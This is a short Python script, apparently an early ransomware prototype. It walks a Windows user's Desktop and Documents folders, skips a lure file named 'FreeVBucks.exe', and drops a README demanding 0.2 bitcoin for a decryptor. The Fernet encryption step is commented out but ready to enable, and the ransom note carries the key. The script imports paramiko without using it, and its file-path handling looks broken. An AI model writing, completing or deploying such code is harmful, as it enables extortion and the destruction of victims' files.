import os
import getpass as gt
from cryptography.fernet import Fernet
import paramiko as p


def main():
    username = gt.getuser()
    directories = [f'C:/Users/{username}/Desktop/', f'C:/Users/{username}/Documents/']
    key = Fernet.generate_key()
    F = Fernet(key)

    current_directory = os.getcwd()
    parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))  # Get the parent directory
    os.chdir(parent_directory)

    for dir in directories:
        if os.path.exists(dir) and os.path.isdir(dir):
            for file in os.listdir(dir):
                if file == "FreeVBucks.exe":
                    continue
                if file == "README.txt":
                    continue
                file_path = os.getcwd() + "/" + dir + file
                with open(file_path, "rb") as file:
                    content = file.read()
                # e_content = F.encrypt(content)
                # with open(file_path, "wb") as file:
                #     file.write(e_content)
                print(file_path)

    with open(directories[1] + "README.txt", "w") as file:
        file.write(
            f'Your files have been encrypted, send 0.2 bitcoin to my bank account, and I will give you the decryptor. KEY: {key}')


if __name__ == "__main__":
    main()
